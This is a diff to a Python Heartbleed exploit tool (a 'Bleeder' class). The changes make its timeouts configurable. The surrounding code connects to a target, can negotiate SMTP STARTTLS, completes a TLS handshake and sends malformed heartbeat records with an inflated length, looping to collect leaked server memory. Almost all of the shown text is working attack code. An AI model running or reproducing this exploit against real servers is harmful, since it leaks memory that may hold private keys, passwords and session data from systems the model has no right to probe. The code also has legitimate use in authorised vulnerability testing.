@@ -17,7 +17,7 @@ def hexdump(s):
     print('  %04x: %-48s %s' % (b, hxdat, pdat))
   print()
 
-def recv_until(s, match, timeout=2.5, maxlength=4096):
+def recv_until(s, match, timeout, maxlength=4096):
   endtime = time.time() + timeout
   rdata = b''
   remain = maxlength
@@ -40,7 +40,7 @@ def recv_until(s, match, timeout=2.5, maxlength=4096):
       remain -= len(data)
   return found,rdata
 
-def recv_len(s, length, timeout=2.5):
+def recv_len(s, length, timeout):
   endtime = time.time() + timeout
   rdata = b''
   remain = length
@@ -59,14 +59,14 @@ def recv_len(s, length, timeout=2.5):
       remain -= len(data)
   return rdata
 
-def initialize_starttls(s, smtp_hostname, verbose):
-  found,buf = recv_until(s, '220 ', 3)
+def init_starttls(s, smtp_hostname, verbose, timeout):
+  found,buf = recv_until(s, '220 ', timeout)
   if verbose:
     print('> %s'%buf)
   if not found: return False
   if b'Microsoft' in buf: return False
   s.send(b'ehlo %s\r\n'%smtp_hostname)
-  found,buf = recv_until(s, b'STARTTLS', 3)
+  found,buf = recv_until(s, b'STARTTLS', timeout)
   if verbose:
     print('> %s'%buf)
   if not found: return False
@@ -74,8 +74,8 @@ def initialize_starttls(s, smtp_hostname, verbose):
   s.recv(1024)
   return True
     
-def recv_tlsrecord(s, verbose):
-  hdr = recv_len(s, 5)
+def recv_tlsrecord(s, verbose, timeout):
+  hdr = recv_len(s, 5, timeout)
   if hdr is None:
     if verbose:
       print('Error: Unexpected EOF receiving record header - server closed connection', file=sys.stderr)
@@ -86,7 +86,7 @@ def recv_tlsrecord(s, verbose):
     if verbose:
       print('Error: Invalid TLS response record received', file=sys.stderr)
     return None, None, None
-  pay = recv_len(s, ln, 5)
+  pay = recv_len(s, ln, timeout)
   if pay is None:
     if verbose:
       print('Error: Unexpected EOF receiving record payload - server closed connection', file=sys.stderr)
@@ -100,10 +100,9 @@ def make_heartbeat(version, length):
   length = struct.pack('>H', length)
   return b'\x18\x03' + version + b'\x00\x03\x01' + length
 
-def loopsend_hb(s, version, length, loops, timeout=2, verbose=False):
+def loopsend_hb(s, version, length, loops, verbose=False):
   length = min(MAX_LENGTH, length)
   hb = make_heartbeat(version, length)
-  s.settimeout(timeout)
   all_data = b''
   try:
     for i in range(loops):
@@ -115,14 +114,14 @@ def loopsend_hb(s, version, length, loops, timeout=2, verbose=False):
     pass
   return len(all_data) > 24, all_data
 
-def send_hb(s, version, length):
+def send_hb(s, version, length, timeout):
   length = min(MAX_LENGTH, length)
   expected = 24 + length
   hb = make_heartbeat(version, length)
   all_data = b''
   try:
     s.send(hb)
-    data = recv_len(s, expected)
+    data = recv_len(s, expected, timeout)
     if data is not None and len(data) > 0:
       all_data += data
   except Exception:
@@ -133,13 +132,14 @@ def blockbytes(blocks):
   return bytes([i for s in blocks for i in s])
 
 class Bleeder(object):
-  def __init__(self, length, ip, port, starttls=False, loops=1, verbose=False, smtp_hostname=None):
+  def __init__(self, length, ip, port, starttls=False, loops=1, verbose=False, timeout=2.5, smtp_hostname=None):
     self.length = length
     self.ip = ip
     self.port = port
     self.starttls = starttls
     self.loops = loops
     self.verbose = verbose
+    self.timeout = timeout
     if smtp_hostname is None:
       smtp_hostname = 'starttlstest'
     self.smtp_hostname = smtp_hostname
@@ -151,8 +151,9 @@ class Bleeder(object):
     try:
       # init connection
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.settimeout(self.timeout)
       s.connect((self.ip, self.port))
-      if self.starttls and not init_starttls(s, self.smtp_hostname, self.verbose):
+      if self.starttls and not init_starttls(s, self.smtp_hostname, self.verbose, self.timeout):
         return False,None
       # build ClientHello
       if self.cipher is None:
@@ -179,7 +180,7 @@ class Bleeder(object):
       s.send(clienthello)
       # wait for the end of the handshake
       while True:
-        typ, ver, pay = recv_tlsrecord(s, self.verbose)
+        typ, ver, pay = recv_tlsrecord(s, self.verbose, self.timeout)
         if typ == None:
           return False,None
         if typ == 22 and pay[0] == 0x02: # handshake
@@ -191,7 +192,7 @@ class Bleeder(object):
         if typ == 22 and pay[0] == 0x0E:
           break
       if self.loops <= 1:
-        vulnerable,data = send_hb(s, ver&0x00FF, self.length)
+        vulnerable,data = send_hb(s, ver&0x00FF, self.length, self.timeout)
       else:
         vulnerable,data = loopsend_hb(s, ver&0x00FF, self.length, self.loops, verbose=self.verbose)
       if vulnerable:
